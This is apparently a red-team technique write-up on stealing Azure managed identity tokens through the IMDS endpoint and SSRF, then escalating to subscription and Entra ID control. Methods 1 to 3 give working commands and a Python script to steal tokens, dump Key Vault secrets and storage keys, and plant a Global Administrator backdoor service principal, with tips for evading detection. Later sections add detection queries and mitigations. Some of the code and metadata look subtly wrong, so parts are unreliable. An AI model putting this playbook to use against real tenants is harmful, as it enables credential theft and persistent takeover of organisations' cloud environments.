# [PE-VALID-011]: Managed Identity MSI Escalation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-011 |
| **MITRE ATT&CK v18.1** | [T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID |
| **Severity** | Critical |
| **CVE** | CVE-2023-28432, CVE-2024-38124, CVE-2025-24054 (related IMDS/SSRF vulnerabilities) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Azure subscriptions, all Azure resource types with managed identities (VMs, Functions, Logic Apps, Automation, AKS, etc.) |
| **Patched In** | N/A (Architectural design; mitigated via IMDS hardening and endpoint protections) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure Managed Identities (formerly called Managed Service Identities or MSI) are cloud-native identities assigned to Azure resources (VMs, Function Apps, Logic Apps, AKS nodes, etc.) to enable those resources to authenticate to other Azure services without managing explicit credentials. When a resource with a managed identity makes an API request to Azure services, it first requests an OAuth2 access token from the Azure Instance Metadata Service (IMDS) at the well-known endpoint `http://169.254.169.254/metadata/identity/oauth2/token`. An attacker who gains command execution or access to a resource with an assigned managed identity can query this IMDS endpoint to steal the identity's access token, then use the token to authenticate as the managed identity and access all Azure resources within the identity's assigned scope. If the managed identity has been assigned high-privilege roles (Owner, Contributor, User Access Administrator) at the subscription or management group level—a common misconfiguration—the attacker can escalate their privileges from limited access to complete infrastructure compromise, including the ability to create backdoors, modify RBAC, access Key Vaults, or pivot to Entra ID Global Admin status.

**Attack Surface:** Azure Instance Metadata Service (IMDS) endpoint (169.254.169.254:80), managed identity token cache, Azure resource configuration (VMs, Functions, Automation Accounts), Web application vulnerabilities (SSRF, RCE) on resources with managed identities.

**Business Impact:** **Complete compromise of Azure subscriptions and potentially Entra ID tenant**. A stolen managed identity token grants the attacker all permissions assigned to that identity. If the identity has Owner role on a subscription, the attacker can: delete all resources, extract all secrets from Key Vaults, modify RBAC to create permanent backdoors, access databases and storage accounts, deploy malware via automation runbooks, or escalate to Entra ID Global Administrator by leveraging cross-tenant service principals.

**Technical Context:** Managed identity token theft occurs with minimal logging (IMDS requests are not logged by default). A single stolen token from an overprivileged managed identity can compromise an entire subscription. Exploitation can occur within seconds of gaining access to a resource. The attack is reversible (disabling the managed identity), but by then secondary backdoor credentials are typically established.

### Operational Risk

- **Execution Risk:** Medium-High – Requires initial compromise of an Azure resource (VM, Function App, etc.) or ability to exploit web application vulnerability (SSRF, RCE), but these are common attack vectors.
- **Stealth:** High – IMDS requests are not logged by default; token usage is logged only if the resulting API calls are monitored; many organizations lack real-time IMDS monitoring.
- **Reversibility:** Yes – Disabling or revoking the managed identity stops the token from working, but by then persistence is typically established via additional backdoors.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.2.5 | Ensure that privileged identities are subject to MFA (not applicable to MSI, but applies to humans using stolen tokens) |
| **DISA STIG** | AC-2(1) | Account Management – Enforce privileged access management for all identities |
| **CISA SCuBA** | IA-2.2 | Require multi-factor authentication for authenticating any individual to an information system or device |
| **NIST 800-53** | AC-3 | Access Enforcement – Enforce approved authorizations |
| **GDPR** | Art. 32(1)(a) | Implement appropriate technical measures for data security |
| **DORA** | Art. 9 | Protection and Prevention of ICT incidents |
| **NIS2** | Art. 21(1)(a) | Risk Management for cyber security |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights |
| **ISO 27005** | Risk Scenario | Unauthorized access to cloud resources via identity theft |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Command execution or access to a resource with an assigned managed identity (System-Assigned or User-Assigned).
- **Required Access:** Network access to the IMDS endpoint (http://169.254.169.254) from within an Azure resource, or ability to exploit SSRF/RCE vulnerability on an Azure-hosted application.

**Supported Versions:**
- **Azure:** All subscriptions and resource types supporting managed identities (VMs, Functions, Logic Apps, Automation Accounts, AKS, Container Instances, etc.)
- **PowerShell:** 5.0+ or PowerShell Core 7.0+
- **Python:** 3.6+ (for token acquisition and exploitation scripts)
- **Bash:** curl/wget availability on compromised resource

**Required Tools:**
- [Az PowerShell Module](https://learn.microsoft.com/en-us/powershell/azure/install-az-ps) (For token-based authentication)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (For token acquisition and resource enumeration)
- [MicroBurst](https://github.com/NetSPI/MicroBurst) (For managed identity privilege enumeration)
- [ROADTools](https://github.com/dirkjanm/ROADtools) (For token manipulation and Entra ID escalation)
- [Pacu](https://github.com/RhinoSecurityLabs/pacu) (Multi-cloud privilege escalation)
- Native tools: `curl`, `Invoke-WebRequest` (PowerShell), `base64`, `jq`

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

#### Step 1: Enumerate All Managed Identities in a Subscription

```powershell
# Connect to Azure
Connect-AzAccount

# List all system-assigned managed identities (via VMs, Functions, etc.)
Get-AzVM | Where-Object { $_.Identity } | Select-Object -Property Name, Identity

# List all user-assigned managed identities
Get-AzUserAssignedIdentity | Select-Object -Property Name, Id, PrincipalId

# For each managed identity, check assigned RBAC roles
$identities = Get-AzUserAssignedIdentity
foreach ($identity in $identities) {
    Write-Host "Identity: $($identity.Name)"
    Get-AzRoleAssignment -ObjectId $identity.PrincipalId | Select-Object -Property RoleDefinitionName, Scope
}
```

**What to Look For:**
- Managed identities with Owner, Contributor, User Access Administrator, or Application Administrator roles.
- Identities assigned at the subscription or management group scope (higher privilege than resource group).
- Identities assigned to resources that may be vulnerable (web apps, functions with user input, etc.).

#### Step 2: Identify Resources with Managed Identities

```powershell
# Find all VMs with managed identities
Get-AzVM | Where-Object { $_.Identity -ne $null } | Select-Object -Property Name, ResourceGroupName, @{Name='IdentityType'; Expression={$_.Identity.Type}}

# Find all Function Apps with managed identities
Get-AzFunctionApp | Where-Object { $_.Identity } | Select-Object -Property Name, @{Name='ManagedIdentity'; Expression={$_.Identity.PrincipalId}}

# Find all Logic Apps with managed identities
Get-AzLogicApp | Where-Object { $_.Identity } | Select-Object -Property Name, @{Name='IdentityType'; Expression={$_.Identity.Type}}

# Find all Automation Accounts with managed identities
Get-AzAutomationAccount | Where-Object { $_.Identity } | Select-Object -Property Name, @{Name='IdentityId'; Expression={$_.Identity.PrincipalId}}
```

**What to Look For:**
- Identify resources that are exposed to the internet or user-controlled input (web servers, API endpoints).
- Look for resources with vulnerabilities (outdated dependencies, RCE vectors).
- Prioritize resources with User-Assigned Managed Identities (easier to escalate via attachment).

#### Step 3: Check IMDS Endpoint Accessibility (from Azure Resource)

```powershell
# This command should be executed FROM an Azure resource (VM, Function App, etc.)
# It queries the IMDS endpoint to retrieve the managed identity's access token

$token = Invoke-WebRequest -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/" `
  -Headers @{Metadata="true"} `
  -UseBasicParsing | ConvertFrom-Json

Write-Host "Managed Identity Token Retrieved:"
Write-Host "Access Token: $($token.access_token.Substring(0,50))..."  # Display first 50 chars only
Write-Host "Token Type: $($token.token_type)"
Write-Host "Expires In: $($token.expires_in) seconds"
```

**What to Look For:**
- If IMDS is accessible, the token is successfully retrieved.
- Token contains claims specifying the managed identity and assigned permissions.
- Indicates the resource is vulnerable to privilege escalation via managed identity theft.

### Linux/Bash / CLI Reconnaissance

#### Step 1: Enumerate Managed Identities via Azure CLI (from Azure Resource)

```bash
# Query IMDS to get the managed identity's access token
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/" | jq -r '.access_token')

# Use the token to authenticate to Azure CLI
az login --use-device-code --allow-no-subscriptions

# Alternatively, set the token as environment variable
export AZURE_ACCESS_TOKEN=$TOKEN

# List resources accessible to this managed identity
az resource list --output table
```

**What to Look For:**
- Successfully retrieved access token indicates IMDS is accessible.
- Resource list shows all resources the managed identity has access to.

#### Step 2: Identify Subscription and Role Information

```bash
# Get subscription information
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/" | jq '.access_token' | \
  base64 -d | jq '.' | grep -E "sub|tid|scp"

# Expected output shows:
# sub: object ID of the managed identity
# tid: tenant ID
# scp: scopes/permissions (e.g., "Reader.ReadWrite.All" or full wildcard "*")
```

**What to Look For:**
- Scope values indicating high-privilege roles (Owner, Contributor, User Access Administrator).
- Wildcard scopes (*) indicate unrestricted permissions.

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Direct IMDS Token Theft from Compromised Azure VM or Function App

**Supported Versions:** All Azure resources with managed identities

#### Step 1: Establish Command Execution on Azure Resource

**Objective:** Gain shell access or code execution capability on a resource with a managed identity.

**Execution Scenarios:**
- Compromise a VM via RDP/SSH with compromised credentials
- Exploit RCE vulnerability in web application (Function App, App Service)
- Deploy malicious code to a Function App trigger
- Gain access to a Logic App execution context

#### Step 2: Query IMDS Endpoint to Retrieve Access Token

**Objective:** Retrieve the managed identity's OAuth2 access token from IMDS.

**Command (PowerShell):**
```powershell
# Retrieve the access token for the managed identity
$token = Invoke-WebRequest -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/" `
  -Headers @{Metadata="true"} `
  -UseBasicParsing | ConvertFrom-Json

$accessToken = $token.access_token
Write-Host "Access Token Retrieved: $($accessToken.Substring(0,50))..."

# Decode the JWT to inspect claims
$jwtParts = $accessToken.Split('.')
$payloadJson = [System.Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($jwtParts[1] + '=='))
$payload = $payloadJson | ConvertFrom-Json

Write-Host "Token Claims:"
Write-Host "  Subject (sub): $($payload.sub)"
Write-Host "  Tenant ID (tid): $($payload.tid)"
Write-Host "  Scopes (scp): $($payload.scp)"
```

**Expected Output:**
```
Access Token Retrieved: eyJhbGciOiJSUzI1NiIsImtpZCI6IjEyMzQ1Njc4OTAiLCJ0eXAiOiJKV1QifQ...
Token Claims:
  Subject (sub): 11111111-1111-1111-1111-111111111111
  Tenant ID (tid): 22222222-2222-2222-2222-222222222222
  Scopes (scp): Reader Contributor User.ReadWrite.All
```

**What This Means:**
- The access token is a JWT (JSON Web Token) that can be used to authenticate to Azure REST APIs.
- The token's scopes indicate the managed identity's permissions (e.g., "Contributor" = high privilege).
- The token is valid for ~1 hour (typically 3600 seconds).

**OpSec & Evasion:**
- IMDS requests are not logged by default in Azure Activity Log.
- The token usage (e.g., API calls made with the token) is logged in Activity Log.
- Detection likelihood: **Low for token retrieval, Medium for token usage** – If the API calls made with the token are unusual, Sentinel may flag them.

**Troubleshooting:**
- **Error:** `The request could not be performed because the Metadata Service is unavailable`
  - **Cause:** IMDS endpoint (169.254.169.254) is not accessible from the resource (possible network restriction).
  - **Fix:** Verify network connectivity; check NSG rules and routing; some managed environments (App Service Slots, sandboxed containers) may block IMDS.

- **Error:** `Missing or invalid Metadata header`
  - **Cause:** The "Metadata: true" header was not included in the request.
  - **Fix:** Ensure the header is included: `-Headers @{Metadata="true"}`

#### Step 3: Authenticate to Azure Using Stolen Token

**Objective:** Use the stolen token to authenticate to Azure and execute operations as the managed identity.

**Command (PowerShell):**
```powershell
# Create an Azure credential object from the access token
$credential = [Microsoft.Azure.Commands.Common.Authentication.AzureCredential]::new()
$credential.CopyFrom([Microsoft.Azure.Commands.Common.Authentication.AzureCredential]::new())

# Alternative: Connect using the access token directly
Connect-AzAccount -AccessToken $accessToken -AccountId $payload.sub -Tenant $payload.tid

# Verify connection
Get-AzContext

# Expected output shows the managed identity is connected
```

**Expected Output:**
```
Name                          Subscription                  Tenant                       Environment
----                          ----                          ------                       -----------
<identity-object-id>          <subscription-id>             <tenant-id>                  AzureCloud
```

**What This Means:**
- The attacker is now authenticated as the managed identity.
- All Azure operations executed will be performed as the managed identity, not the compromised user account.
- The level of access depends on the roles assigned to the managed identity.

#### Step 4: Enumerate and Access Resources with the Stolen Identity

**Objective:** Use the stolen identity to access all Azure resources within its scope.

**Command (PowerShell):**
```powershell
# List all accessible resources
Get-AzResource | Select-Object -Property Name, ResourceType, ResourceGroupName

# List Key Vaults accessible to this identity
Get-AzKeyVault | Select-Object -Property VaultName, ResourceGroupName

# If the identity has Key Vault access, dump all secrets
foreach ($vault in Get-AzKeyVault) {
    Write-Host "Dumping secrets from $($vault.VaultName):"
    Get-AzKeyVaultSecret -VaultName $vault.VaultName -WarningAction SilentlyContinue | ForEach-Object {
        $secret = Get-AzKeyVaultSecret -VaultName $vault.VaultName -Name $_.Name
        Write-Host "  Secret: $($_.Name) = $($secret.SecretValue | ConvertFrom-SecureString -AsPlainText)"
    }
}

# List storage accounts and access blobs/tables
Get-AzStorageAccount | ForEach-Object {
    Write-Host "Storage Account: $($_.StorageAccountName)"
    $keys = Get-AzStorageAccountKey -ResourceGroupName $_.ResourceGroupName -Name $_.StorageAccountName
    Write-Host "  Storage Key: $($keys[0].Value)"
}
```

**Expected Output (If Owner Role):**
```
Name                       ResourceType                               ResourceGroupName
----                       ----                                       ------------------
MyDatabase                 Microsoft.Sql/servers/databases            MyResourceGroup
MyVirtualMachine           Microsoft.Compute/virtualMachines          MyResourceGroup
MyKeyVault                 Microsoft.KeyVault/vaults                  MyResourceGroup

Dumping secrets from MyKeyVault:
  Secret: database-password = P@ssw0rd123!
  Secret: api-key = sk-abc123...

Storage Account: mystorageacct
  Storage Key: DefaultEndpointsProtocol=https;AccountName=mystorageacct;...
```

**What This Means:**
- The attacker has full access to all secrets, keys, and data accessible to the managed identity.
- If the identity has Owner role, the attacker can modify RBAC and create permanent backdoors.

---

### METHOD 2: SSRF Exploitation to Steal Managed Identity Token from Web Application

**Supported Versions:** All web applications hosted on Azure resources with managed identities (Function Apps, App Services, Logic Apps, etc.)

#### Step 1: Identify SSRF Vulnerability in Web Application

**Objective:** Find a Server-Side Request Forgery (SSRF) vulnerability in an Azure-hosted web application.

**Common Vulnerable Patterns:**
- URL parameter that is fetched server-side (e.g., `/?image=http://...`)
- Proxy or webhook functionality
- URL validation bypasses (e.g., `http://localhost`, `http://127.0.0.1`, `http://169.254.169.254`)
- XML/JSON deserialization with external entity injection

**Testing (Example):**
```
Request:
GET /?url=http://example.com/file HTTP/1.1

Response:
[Contents of example.com fetched server-side]
```

**Vulnerability Confirmation:**
```
Request:
GET /?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/ HTTP/1.1

Response (if vulnerable):
{"access_token": "eyJhbGciOiJSUzI1Ni...", "expires_in": 3600, ...}
```

#### Step 2: Exploit SSRF to Query IMDS Endpoint

**Objective:** Use the SSRF vulnerability to retrieve the managed identity's access token.

**Command (HTTP Request):**
```http
GET /?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/ HTTP/1.1
Host: vulnerable-app.azurewebsites.net

# Response will include the access token
{"access_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6IjEyMzQ1Njc4OTAiLCJ0eXAiOiJKV1QifQ...", "expires_in": 3600}
```

**Command (Python):**
```python
import requests
import json

# Target application with SSRF vulnerability
target_url = "http://vulnerable-app.azurewebsites.net/?url="

# IMDS endpoint to query
imds_url = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/"

# Exploit SSRF to fetch IMDS
response = requests.get(target_url + imds_url, headers={"Metadata": "true"})

if response.status_code == 200:
    token_data = response.json()
    access_token = token_data['access_token']
    print(f"[+] Token stolen: {access_token[:50]}...")
else:
    print(f"[-] Failed: {response.status_code}")
```

**Expected Output:**
```
[+] Token stolen: eyJhbGciOiJSUzI1NiIsImtpZCI6IjEyMzQ1Njc4OTAiLCJ0eXAiOiJKV1QifQ...
```

**OpSec & Evasion:**
- SSRF exploits may leave traces in web application logs.
- Use header manipulation to bypass IMDS protections (e.g., via proxy redirection).
- Detection likelihood: **Medium** – IMDS access from unexpected patterns may be flagged by WAF or Azure Defender.

#### Step 3: Use Stolen Token to Escalate Privileges

**Objective:** Use the token to access Azure resources and escalate privileges.

**Command (curl from external attacker machine):**
```bash
# Use the stolen token to authenticate to Azure REST API
TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6IjEyMzQ1Njc4OTAiLCJ0eXAiOiJKV1QifQ..."

# List subscriptions accessible to this identity
curl -X GET "https://management.azure.com/subscriptions?api-version=2020-01-01" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json"

# If the identity has Owner role, enumerate all resources
SUBSCRIPTION_ID="12345678-1234-1234-1234-123456789012"
curl -X GET "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resources?api-version=2021-04-01" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json"

# Extract secrets from Key Vault
VAULT_NAME="MyVault"
curl -X GET "https://$VAULT_NAME.vault.azure.net/secrets?api-version=7.0" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json"
```

**Expected Output (Resource List):**
```json
{
  "value": [
    {
      "id": "/subscriptions/12345678.../resourceGroups/MyGroup/providers/Microsoft.Compute/virtualMachines/MyVM",
      "name": "MyVM",
      "type": "Microsoft.Compute/virtualMachines"
    },
    ...
  ]
}
```

**What This Means:**
- The attacker has successfully used the stolen token to access Azure REST APIs.
- All Azure resources are now enumerable and (depending on the managed identity's role) modifiable.

---

### METHOD 3: Privilege Escalation from Overprivileged Managed Identity to Entra ID Global Admin

**Supported Versions:** All Azure environments with Entra ID integration

#### Step 1: Steal Token from Managed Identity with Subscription Owner Role

**Objective:** Obtain access token from a managed identity that has Owner role on a subscription.

**Prerequisites:**
- Access to a resource with an Owner-level managed identity attached.
- IMDS endpoint accessible from that resource.

**Command (PowerShell):**
```powershell
# Retrieve token (from the compromised resource)
$token = Invoke-WebRequest -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/" `
  -Headers @{Metadata="true"} `
  -UseBasicParsing | ConvertFrom-Json

$accessToken = $token.access_token

# Authenticate as the owner-level managed identity
Connect-AzAccount -AccessToken $accessToken -Tenant (jq -r '.tid' <<< $token)
```

#### Step 2: Create a Backdoor Service Principal with Entra ID Admin Permissions

**Objective:** Create a service principal that has global admin permissions in Entra ID.

**Command (PowerShell - must be executed with Owner-level identity):**
```powershell
# Create an application in Entra ID (requires Application.Create permission)
$app = New-AzADApplication -DisplayName "BackdoorApp" -AvailableToOtherTenants $false

Write-Host "Application Created: $($app.Id)"

# Create a service principal for the application
$sp = New-AzADServicePrincipal -ApplicationId $app.AppId -DisplayName "BackdoorSP"

Write-Host "Service Principal Created: $($sp.Id)"

# Add a credential to the service principal (certificate or password)
$credential = New-AzADServicePrincipalCredential -ObjectId $sp.Id

Write-Host "Credential Created: $($credential.KeyId)"
Write-Host "Credential Secret: $($credential.SecretText)"  # Save this for later use

# Assign Global Administrator role to the service principal
# Note: This requires elevated permissions (typically Global Admin or Privileged Role Administrator)
$roleDefinition = Get-AzRoleDefinition -Name "Global Administrator"
New-AzRoleAssignment -ObjectId $sp.Id -RoleDefinitionId $roleDefinition.Id -Scope "/"

Write-Host "Global Administrator role assigned to service principal"
```

**Expected Output:**
```
Application Created: 11111111-1111-1111-1111-111111111111
Service Principal Created: 22222222-2222-2222-2222-222222222222
Credential Created: 33333333-3333-3333-3333-333333333333
Credential Secret: 1a2b3c4d5e6f7g8h9i0j...
Global Administrator role assigned to service principal
```

**What This Means:**
- A backdoor service principal now exists with Global Admin permissions on the Entra ID tenant.
- The attacker can use the credential to maintain persistent access even after the original compromise is detected.

**OpSec & Evasion:**
- The service principal creation is logged in Entra ID audit logs (OperationName: "Add application").
- The role assignment is also logged.
- To evade detection, distribute the creation over time or use a legitimate-sounding name (e.g., "ServiceBusApp").
- Detection likelihood: **High** – Entra ID should alert on service principal creation and Global Admin assignment to non-human principals.

#### Step 3: Maintain Persistent Access via Stolen Service Principal Credentials

**Objective:** Use the backdoor service principal to maintain long-term access to the tenant.

**Command (From external attacker machine):**
```powershell
# Install AzureAD module
Install-Module -Name AzureAD -Force

# Authenticate as the backdoor service principal
$credential = New-Object System.Management.Automation.PSCredential(
  "11111111-1111-1111-1111-111111111111",
  (ConvertTo-SecureString "1a2b3c4d5e6f7g8h9i0j..." -AsPlainText -Force)
)

Connect-AzureAD -Credential $credential -TenantId "22222222-2222-2222-2222-222222222222"

# Verify Global Admin permissions
Get-AzureADDirectoryRole | Where-Object { $_.DisplayName -eq "Global Administrator" }

# Now the attacker has full Entra ID access
# Can enumerate users, modify policies, create additional backdoors, etc.
Get-AzureADUser | Select-Object -Property DisplayName, UserPrincipalName
```

**Expected Output:**
```
ObjectId                             Name
--------                             ----
11111111-1111-1111-1111-111111111111 Global Administrator

DisplayName            UserPrincipalName
-----------            -----------------
Admin User             admin@company.com
Backup Admin           backupadmin@company.com
[Service Principal - Attacker can now impersonate these users]
```

---

## 6. ATTACK SIMULATION & VERIFICATION

This technique does not map to Atomic Red Team due to cloud-native token-based nature. Verification can be achieved through:

1. **Test Environment Setup:**
   - Deploy an Azure VM or Function App with a managed identity assigned
   - Assign the managed identity an elevated role (Contributor or Owner)
   - Execute the commands in Method 1 to verify token retrieval

2. **Detection Verification:**
   - Deploy Sentinel rules to detect IMDS access patterns
   - Execute token theft and monitor for alerts
   - Verify that role changes and service principal creation trigger alerts

---

## 7. TOOLS & COMMANDS REFERENCE

### Az PowerShell Module

**Official Documentation:** [Azure PowerShell Managed Identity](https://learn.microsoft.com/en-us/powershell/module/az.accounts/connect-azaccount)

**Version:** 9.0+ (Latest: 11.x)

**Key Commands for Managed Identity Exploitation:**
```powershell
Get-AzUserAssignedIdentity                    # List all UAMI
Get-AzVM | Where-Object { $_.Identity }       # Find VMs with MSI
Get-AzRoleAssignment -ObjectId "<IDENTITY_ID>"  # Check identity's roles
Connect-AzAccount -AccessToken $token         # Authenticate using stolen token
```

### MicroBurst

**Repository:** [NetSPI/MicroBurst](https://github.com/NetSPI/MicroBurst)

**Version:** Latest (PowerShell module)

**Installation:**
```powershell
Import-Module .\MicroBurst.psm1
```

**Key Commands:**
```powershell
Get-AzureAuthToken                            # Retrieve auth token from IMDS
Invoke-AzureManagedIdentityRoleEnumeration    # Enumerate managed identity roles
Find-AzureServicePrincipalPermissions         # Find overprivileged service principals
```

### ROADTools

**Repository:** [dirkjanm/ROADtools](https://github.com/dirkjanm/ROADtools)

**Installation:**
```bash
pip3 install roadtools
```

**Key Commands:**
```bash
roadrecon auth -u "<user@domain.com>" -p "<password>"   # Authenticate
roadrecon gather                                         # Gather Entra ID data
roadrecon query --filter "servicePrincipals"             # Find service principals
```

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Suspicious IMDS Access Patterns

**Rule Configuration:**
- **Required Table:** AzureActivity, AzureDiagnostics
- **Required Fields:** CallerIpAddress, OperationName, ResourceType
- **Alert Severity:** High
- **Frequency:** Real-time (5 minutes)
- **Applies To Versions:** All

**KQL Query:**
```kusto
// Detect unusual IMDS access patterns or token requests
let IMDSRequests = AzureActivity
| where tostring(parse_json(tostring(json_parse(tostring(Properties)))).requests[0].requestUri) contains "169.254.169.254"
    or tostring(parse_json(tostring(json_parse(tostring(Properties)))).requests[0].requestUri) contains "/metadata/identity/oauth2/token"
| where TimeGenerated > ago(24h);

let SuspiciousPatterns = IMDSRequests
| where CallerIpAddress !in ("127.0.0.1", "169.254.169.254")  // IMDS should only be accessed from localhost or metadata service
| where OperationName !in ("List", "Get")  // Normal operations
| summarize Count = count(), Callers = make_set(CallerIpAddress) by TimeGenerated, ResourceType
| where Count >= 5;  // Alert if more than 5 suspicious IMDS requests

SuspiciousPatterns
```

**What This Detects:**
- Excessive IMDS requests from a single resource
- IMDS requests with unusual parameters
- Token requests from unexpected resources

### Query 2: Managed Identity Token Used for Unusual API Calls

**Rule Configuration:**
- **Required Table:** AzureActivity
- **Alert Severity:** High
- **Frequency:** 30 minutes
- **Applies To Versions:** All

**KQL Query:**
```kusto
// Detect when a managed identity makes API calls it normally doesn't make
let ManagedIdentityTokens = AzureActivity
| where Identity contains "msi" or Caller contains "msi"
| distinct Identity, ResourceType;

let UnusualOperations = AzureActivity
| where Identity in (ManagedIdentityTokens) 
    and (OperationName == "Create role assignment" 
         or OperationName == "Delete role definition"
         or OperationName == "Create service principal"
         or OperationName == "Update application")
| summarize Count = count(), Operations = make_set(OperationName) by Identity, TimeGenerated
| where Count >= 1;  // Alert on any suspicious operation

UnusualOperations
```

**What This Detects:**
- A managed identity performing RBAC modifications
- Service principal or application creation by a managed identity
- Privilege escalation attempts via role assignment

### Query 3: Service Principal Creation with Entra ID Admin Role

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Alert Severity:** Critical
- **Frequency:** Real-time

**KQL Query:**
```kusto
// Detect when a service principal is assigned Global Administrator or other privileged Entra ID roles
AuditLogs
| where OperationName == "Add role assignment"
    and TargetResources[0].type == "ServicePrincipal"
    and (TargetResources has "Global Administrator" 
         or TargetResources has "Privileged Role Administrator"
         or TargetResources has "Application Administrator")
| extend ServicePrincipalName = TargetResources[0].displayName
| extend InitiatedByUser = tostring(InitiatedBy.user.userPrincipalName)
| summarize by TimeGenerated, ServicePrincipalName, InitiatedByUser, TargetResources
```

**What This Detects:**
- Any service principal being assigned Global Administrator or other privileged roles
- Indicates potential backdoor creation via privilege escalation

---

## 9. WINDOWS EVENT LOG MONITORING

N/A - This is a cloud-native attack with no local Windows event log artifacts. Detection occurs exclusively in Azure Activity Log and Entra ID audit logs.

---

## 10. MICROSOFT DEFENDER FOR CLOUD

### Alert: Suspicious Service Principal Activity

**Alert Name:** `Suspicious service principal activity detected`

**Severity:** Critical

**Description:** A service principal made an unusual API request (such as RBAC modification, application creation, or domain manipulation) that is inconsistent with its normal behavior.

**Applies To:** All Azure subscriptions with Defender for Cloud enabled

**Remediation:**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud** → **Security alerts**
2. Click on the alert to see details
3. **Verify legitimacy:**
   - Is this service principal expected to perform this operation?
   - Did it occur outside normal maintenance windows?
4. **If malicious:**
   - Disable the service principal: `Disable-AzureADServicePrincipal -ObjectId <ID>`
   - Revoke all credentials: `Remove-AzADServicePrincipalCredential -ObjectId <ID>`
   - Audit all actions performed: Review Activity Log for the past 7 days
   - Restore from backup if necessary

---

## 11. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: Service Principal and Role Assignment Changes

```powershell
# Search for service principal creation
Search-UnifiedAuditLog -Operations "Add service principal", "Add application", "Add role assignment" `
  -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) |
  Select-Object @{n='User';e={$_.UserIds}}, @{n='Operation';e={$_.Operations}}, `
  @{n='Timestamp';e={$_.CreationDate}}, @{n='Details';e={$_.AuditData}} |
  Export-Csv -Path "C:\Incident\service_principal_changes.csv"
```

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Disable Managed Identity Assignment to Non-Critical Resources:** Restrict which resources can have managed identities assigned.
  
  **Applies To Versions:** All Azure subscriptions
  
  **Manual Steps (Azure Policy):**
  1. Navigate to **Azure Portal** → **Policy** → **Definitions**
  2. Create new policy: `Deny managed identity on non-approved resource types`
  3. Policy rule:
     ```json
     {
       "if": {
         "allOf": [
           { "field": "type", "notIn": ["Microsoft.Compute/virtualMachines", "Microsoft.Web/sites"] },
           { "field": "identity.type", "exists": true }
         ]
       },
       "then": { "effect": "deny" }
     }
     ```
  4. Assign policy to subscription/management group
  5. Review and approve assignments
  
  **Validation Command:**
  ```powershell
  # Verify policy is enforced
  Get-AzPolicyAssignment | Where-Object { $_.DisplayName -contains "Deny managed identity" }
  ```

- **Restrict IMDS Access to Authorized Endpoints Only:** Enable IMDS hardening to prevent token theft.
  
  **Applies To Versions:** All Azure VMs
  
  **Manual Steps (VM Network Security Groups):**
  1. Navigate to **Azure Portal** → **Virtual Machines** → Select VM
  2. Go to **Networking** → **Network interfaces** → Select NIC
  3. **Network Security Group** → **Inbound security rules**
  4. Add rule:
     - Priority: 100
     - Protocol: TCP
     - Source Port Range: *
     - Destination Port Range: 80
     - Source: VirtualNetwork (only)
     - Destination: 169.254.169.254/32 (IMDS only)
     - Action: Allow
  5. Add blocking rule for non-IMDS access:
     - Priority: 200
     - Protocol: TCP
     - Destination Port Range: 80
     - Source: VirtualNetwork
     - Destination: Internet (anything else)
     - Action: Deny
  
  **Validation Command:**
  ```powershell
  # Verify NSG rules restrict IMDS
  Get-AzNetworkSecurityGroup | ForEach-Object {
    Get-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $_ | 
      Where-Object { $_.DestinationAddressPrefix -contains "169.254.169.254" }
  }
  ```

- **Require MFA for All Managed Identity Usage:** Enforce Conditional Access policies that require MFA when a managed identity accesses sensitive resources.
  
  **Applies To Versions:** All
  
  **Manual Steps (Conditional Access - Entra ID):**
  1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Block unmanaged managed identity access`
  4. **Assignments:**
     - Cloud apps or actions: **Select cloud apps** → **Microsoft Azure Management**
  5. **Conditions:**
     - Client apps: **Select** → Uncheck "Browser", keep only "Modern authentication clients"
     - (Note: Conditional Access doesn't directly block MSI, but can restrict API access from unusual locations/times)
  6. **Access controls:** Grant: **Require device to be compliant**
  7. Enable policy: **On**
  
  **Note:** Conditional Access for service principals is limited; the recommendation is to use PIM (Privileged Identity Management) instead.

- **Implement Least Privilege for Managed Identities:** Ensure managed identities have minimal necessary permissions.
  
  **Applies To Versions:** All
  
